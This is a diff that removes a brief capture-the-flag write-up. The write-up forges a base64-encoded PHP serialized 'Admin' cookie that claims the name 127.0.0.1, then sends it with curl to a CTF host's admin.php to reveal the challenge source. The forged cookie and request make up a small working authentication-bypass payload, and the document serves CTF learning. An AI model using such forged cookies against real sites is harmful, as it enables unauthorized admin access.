@@ -1,6 +1,0 @@
-First we get a cookie that encodes our IP address and we have to spoof it so that it is the IP address of the admin user. What's the IP address of admin? 127.0.0.1 or otherwise known as LOCALHOST.
-
-'O:5:"Admin":1:{s:4:"name";s:9:"127.0.0.1";}'.encode("base64") => Tzo1OiJBZG1pbiI6MTp7czo0OiJuYW1lIjtzOjk6IjEyNy4wLjAuMSI7fQ==
-curl --cookie-jar - http://web.camsctf.com/f/admin.php -b "data=Tzo1OiJBZG1pbiI6MTp7czo0OiJuYW1lIjtzOjk6IjEyNy4wLjAuMSI7fQ=="
-
-And then we get the actual source. Knp3HWpc.php
